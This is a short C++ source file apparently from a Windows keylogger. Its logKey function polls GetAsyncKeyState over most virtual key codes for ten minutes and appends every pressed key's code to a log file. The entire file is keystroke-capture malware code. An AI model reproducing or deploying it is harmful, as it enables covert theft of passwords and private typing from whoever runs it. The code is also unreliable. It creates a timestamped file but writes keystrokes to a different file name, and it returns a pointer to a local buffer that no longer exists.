#include "Logger.h"

using namespace std;

char * logKey() {
    char file_time[100];
    char file_name[500];

    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(file_time, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
    sprintf(file_name, "%s%s%s", FILE_NAME, file_time, FILE_EXT);

    FILE *file = fopen(file_name, "w");

    time_t date = time(NULL);
    fprintf(file, "0\n%s\t", ctime(&date));
    fclose(file);

    unsigned short ch=0, i=0;


    time_t start, end;
    start = time(NULL);
    end = time(NULL);


    while ( difftime(end, start) <= 600.0 ) {
        ch = 1;

        while ( ch < 250 ) {
            for ( i = 0; i < 50; i++, ch++ ) {
                if ( GetAsyncKeyState(ch) == -32767 ) {
                    file = fopen(FILE_NAME, "a");
                    fprintf(file, "%d", ch);
                    fclose(file);
                }
            }
            Sleep(1);
        }
        end = time(NULL);
    }

    return file_name;
}